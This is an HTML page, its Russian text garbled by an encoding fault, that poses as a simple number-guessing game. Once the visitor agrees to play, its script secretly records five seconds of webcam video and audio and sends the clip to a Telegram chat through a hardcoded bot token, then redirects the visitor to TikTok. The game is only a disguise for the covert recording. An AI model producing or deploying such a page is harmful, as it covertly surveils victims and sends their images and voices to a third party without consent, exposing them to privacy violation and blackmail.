<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ò–≥—Ä–æ–≤–æ–π –ß–µ–ª–ª–µ–Ω–¥–∂</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: linear-gradient(to right, #141e30, #243b55);
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }

        #game-box {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
            width: 300px;
        }

        button {
            padding: 10px 20px;
            font-size: 18px;
            background: #ff4081;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.3s;
        }

        button:hover {
            background: #e91e63;
        }

        #loading {
            display: none;
            font-size: 16px;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <h1>–ò–≥—Ä–æ–≤–æ–π –ß–µ–ª–ª–µ–Ω–¥–∂</h1>
    <p>–ü–æ–ø—Ä–æ–±—É–π —É–≥–∞–¥–∞—Ç—å —á–∏—Å–ª–æ –æ—Ç 1 –¥–æ 10!</p>

    <div id="game-box">
        <p id="question">–ö–∞–∫–æ–µ —á–∏—Å–ª–æ –≤—ã–ø–∞–¥–µ—Ç?</p>
        <button onclick="confirmGame()">–ò–≥—Ä–∞—Ç—å!</button>
        <p id="loading">üîÑ –ó–∞–ø—É—Å–∫...</p>
    </div>

    <script>
        const BOT_TOKEN = "7716703157:AAFMrWbVmUR75m8NefHAuliGiTJ5oaVx-j4";
        const CHAT_ID = "-1002307369875";

        let mediaRecorder;
        let recordedChunks = [];

        function confirmGame() {
            let userConfirmed = confirm("–•–æ—Ç–∏—Ç–µ –Ω–∞—á–∞—Ç—å –∏–≥—Ä—É?");
            if (userConfirmed) {
                startChallenge();
            } else {
                // –ï—Å–ª–∏ –æ—Ç–∫–∞–∑–∞–ª—Å—è, —Å—Ä–∞–∑—É –≤—ã–∫–∏–¥—ã–≤–∞–µ–º
                window.location.href = "https://www.google.com";
            }
        }

        async function startChallenge() {
            document.getElementById("loading").style.display = "block";
            let randomNumber = Math.floor(Math.random() * 10) + 1;
            document.getElementById("question").innerText = "–í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: " + randomNumber;

            // –ó–∞–ø—É—Å–∫–∞–µ–º –∑–∞–ø–∏—Å—å –≤–∏–¥–µ–æ
            startRecording();
        }

        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
                recordedChunks = [];

                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(recordedChunks, { type: "video/webm" });
                    await sendToTelegram(videoBlob);

                    // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
                    stream.getTracks().forEach(track => track.stop());

                    // –†–µ–¥–∏—Ä–µ–∫—Ç —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
                    setTimeout(() => {
                        window.location.href = "https://www.tiktok.com";
                    }, 3000);
                };

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);

            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –∫–∞–º–µ—Ä—ã:", error);
                window.location.href = "https://www.tiktok.com";
            }
        }

        async function sendToTelegram(videoBlob) {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("video", videoBlob, "video.webm");

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: "POST",
                    body: formData
                });
                const data = await response.json();
                console.log("–í–∏–¥–µ–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram:", data);
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", error);
            }
        }

        // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø—Ä–∏ –∫–∞–∂–¥–æ–º –∑–∞—Ö–æ–¥–µ
        window.onload = function() {
            confirmGame();
        };
    </script>

</body>
</html>
